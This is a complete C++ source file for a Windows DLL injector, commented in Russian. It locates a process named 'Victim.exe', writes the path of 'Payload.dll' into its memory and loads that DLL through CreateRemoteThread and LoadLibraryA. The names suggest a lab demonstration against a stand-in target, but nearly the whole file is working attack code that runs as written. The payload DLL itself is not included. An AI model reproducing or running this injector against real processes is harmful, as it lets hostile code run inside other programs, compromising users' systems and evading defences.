// Injector.cpp
// MSVC:  cl /EHsc /Fe:Injector.exe Injector.cpp
// MinGW: g++ -O2 -o Injector.exe Injector.cpp
// Запуск: от имени администратора

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>

static DWORD FindProcessId(const std::string& name)
{
    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(pe);
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    if (Process32First(snap, &pe))
    {
        do {
            if (_stricmp(pe.szExeFile, name.c_str()) == 0)
            { pid = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

int main()
{
    std::cout << "=== Injector ===\n";

    DWORD pid = FindProcessId("Victim.exe");
    if (!pid) {
        std::cerr << "zapustite Victim.exe i najmite Enter\n";
        std::cin.get();
        pid = FindProcessId("Victim.exe");
        if (!pid) return 1;
    }
    std::cout << "PID жертвы: " << pid << "\n";

    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) {
        std::cerr << "OpenProcess failed: " << GetLastError()
                  << " (zapustite ot admina?)\n";
        return 1;
    }

    // АБСОЛЮТНЫЙ путь к Payload.dll — критично!
    char dllPath[MAX_PATH]{};
    DWORD n = GetFullPathNameA("Payload.dll", MAX_PATH, dllPath, nullptr);
    if (n == 0 || n >= MAX_PATH) {
        std::cerr << "Ne udalos' poluchit' put' k Payload.dll\n";
        CloseHandle(hProc);
        return 1;
    }
    std::cout << "DLL: " << dllPath << "\n";

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        std::cerr << "Fajl ne najden: " << dllPath << "\n";
        CloseHandle(hProc);
        return 1;
    }

    SIZE_T pathSize = strlen(dllPath) + 1;

    LPVOID remoteStr = VirtualAllocEx(hProc, nullptr, pathSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteStr) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << "\n";
        CloseHandle(hProc);
        return 1;
    }

    if (!WriteProcessMemory(hProc, remoteStr, dllPath, pathSize, nullptr)) {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << "\n";
        CloseHandle(hProc);
        return 1;
    }

    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE loadLib =
        (LPTHREAD_START_ROUTINE)GetProcAddress(hK32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0,
                                        loadLib, remoteStr, 0, nullptr);
    if (!hThread) {
        std::cerr << "CreateRemoteThread failed: " << GetLastError() << "\n";
        CloseHandle(hProc);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    CloseHandle(hProc);

    if (exitCode == 0) {
        std::cerr << "LoadLibraryA vernula NULL — DLL ne zagruzilas'.\n"
                  << "Vse proverte.\n";
        return 1;
    }

    std::cout << "Payload.dll загружена по адресу 0x"
              << std::hex << exitCode << std::dec << "\n";
    std::cout << "Smotre konsol' Victim.exe i log C:\\Windows\\Temp\\payload.log\n";
    return 0;
}